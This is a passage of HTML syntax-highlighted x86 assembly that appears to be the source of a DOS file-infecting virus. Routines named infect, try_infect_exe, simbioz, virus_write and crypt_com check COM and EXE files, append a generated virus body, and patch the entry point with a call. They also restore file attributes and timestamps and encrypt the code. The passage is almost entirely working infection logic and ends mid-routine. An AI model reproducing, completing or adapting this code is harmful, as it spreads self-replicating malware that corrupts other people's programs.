      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">OfsCom</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">_$8</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">_$8</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">KeyCom</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">test_simbioz</span><span class="sc0">
</span><span class="sc5">_close</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">__2</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">simbioz</span><span class="sc0">
</span><span class="sc10">$</span><span class="sc5">$close</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">
</span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_enuns</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">
</span><span class="sc5">exe_filez</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_end</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">fsize1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">fsize2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> 
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1234h</span><span class="sc0">
      </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">      
      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc2">300</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">
      </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">close</span><span class="sc0">
      </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__5</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5000</span><span class="sc0">
      </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">
</span><span class="sc5">__5</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">  
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc0">
</span><span class="sc5">__7</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
      </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">
      </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">__7</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">OfsCom</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">__8</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__8</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">KeyCom</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">test_infect</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">close</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">try_infect_exe</span><span class="sc0">
</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5701h</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0">
</span><span class="sc5">end_attr</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">infect</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">test_infect</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc1">; ax:dx - file size</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">101</span><span class="sc0">
      </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0"> 

</span><span class="sc5">test_simbioz</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> 
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">exe_header</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">   
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">err_check</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">err_check</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc5">no_0B8</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">lodsb</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B9h</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_B9</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10b</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc0"> 
      </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> 
      </span><span class="sc6">jb</span><span class="sc0">   </span><span class="sc5">err_check</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc0">   
      </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">no_B8</span><span class="sc0">
</span><span class="sc5">no_B9</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_FC</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A4F3h</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">ok_find</span><span class="sc0">
</span><span class="sc5">no_FC</span><span class="sc4">:</span><span class="sc0"> 
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">110b</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_B8</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> 
      </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">  
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
      </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">err_check</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">no_B8</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">no_0B8</span><span class="sc0">
      </span><span class="sc6">jcxz</span><span class="sc0"> </span><span class="sc5">err_check</span><span class="sc0">
</span><span class="sc5">ok_find</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11b</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">err_check</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">err_check</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">stc</span><span class="sc0"> 
      </span><span class="sc6">ret</span><span class="sc0">  
      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">simbioz</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> 
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LostBytes_1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LostBytes_2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fsize1</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">   
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_body</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">virus_write</span><span class="sc0"> 
      </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc0">
      </span><span class="sc6">jc</span><span class="sc0">   </span><span class="sc5">__1</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exe_header</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
      </span><span class="sc6">neg</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0"> 
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fsize1</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> 
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_header</span><span class="sc0">
      </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">__1</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt_com</span><span class="sc0">
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">
      </span><span class="sc9">endp</span><span class="sc0">      

</span><span class="sc5">_enuns</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0"> 
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">7</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">enun</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">
      </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">__1</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Enuns</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> 
      </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__1</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fsize1</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">7</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc5">fsize1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">   
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_body</span><span class="sc0"> 
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">enun</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0"> 
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">7</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> 
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buf_seg</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">enun</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">rep</span><span class="sc0">  </span><span class="sc6">movs</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc0">    
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">virus_write</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
      </span><span class="sc6">jc</span><span class="sc0">   </span><span class="sc5">__1</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_beg</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fsize1</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> 
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exe_header</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_header</span><span class="sc0">
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">
      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">virus_write</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buf_seg</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">fsize1</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">11</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">fsize2</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">11</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">      
      </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0"> 
      </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">try_infect_exe</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
      </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__2</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">exe_header</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.mzPages</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__6</span><span class="sc0">
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">__6</span><span class="sc4">:</span><span class="sc0">
